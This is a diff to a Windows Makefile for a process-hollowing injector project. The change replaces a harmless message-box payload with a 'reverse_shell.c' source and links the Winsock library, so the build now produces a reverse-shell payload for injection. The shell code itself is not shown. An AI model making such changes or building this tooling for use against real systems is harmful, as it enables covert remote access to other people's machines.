@@ -12,7 +12,7 @@ PAYLOAD_DIR = payload
 INJECTOR_OBJS = $(OBJ_DIR)\main.obj $(OBJ_DIR)\pe_parser.obj $(OBJ_DIR)\hollowing.obj
 TARGET = $(BIN_DIR)\injector.exe
 
-PAYLOAD_SRC = $(PAYLOAD_DIR)\dummy_msg.c
+PAYLOAD_SRC = $(PAYLOAD_DIR)\reverse_shell.c
 PAYLOAD_TARGET = $(BIN_DIR)\payload.exe
 
 all: setup $(TARGET) payload
@@ -29,8 +29,7 @@ $(TARGET): $(INJECTOR_OBJS)
 
 payload: setup
 	$(CC) $(CFLAGS) $(PAYLOAD_SRC) /Fo$(OBJ_DIR)\dummy_msg.obj /Fe:$(PAYLOAD_TARGET) \
-	/link /SUBSYSTEM:WINDOWS user32.lib \
-	/PDB:$(OBJ_DIR)\payload.pdb /ILK:$(OBJ_DIR)\payload.ilk
+	/link /SUBSYSTEM:WINDOWS user32.lib ws2_32.lib /PDB:$(OBJ_DIR)\payload.pdb /ILK:$(OBJ_DIR)\payload.ilk
 
 clean:
 	@if exist $(OBJ_DIR) rd /s /q $(OBJ_DIR)
